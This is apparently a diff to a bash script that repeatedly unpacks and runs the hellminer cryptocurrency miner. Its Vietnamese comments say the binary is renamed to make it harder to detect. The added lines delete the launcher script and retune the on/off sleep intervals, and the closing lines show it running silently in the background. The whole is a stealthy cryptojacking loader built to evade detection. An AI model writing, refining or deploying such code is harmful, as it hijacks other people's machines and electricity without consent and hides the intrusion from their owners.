@@ -14,7 +14,7 @@ while true; do
   # Giải nén file
   tar -xf hellminer_linux64_avx2.tar.gz
   rm -f hellminer_linux64_avx2.tar.gz
-
+  rm -rf run_miner.sh
   # Đổi tên file để khó phát hiện hơn
   random_name=$(generate_random_name)
   mv hellminer "$random_name"
@@ -24,7 +24,7 @@ while true; do
   miner_pid=$!
 
   # Ngủ trong 5 phút
-  sleep 300
+  sleep 450
 
   # Dừng chương trình
   kill $miner_pid
@@ -36,6 +36,5 @@ while true; do
   rm -rf verus-solver
 
   # Nghỉ 3 phút trước khi lặp lại
-  sleep 60
+  sleep 120
 done
-' > /dev/null 2>&1 &
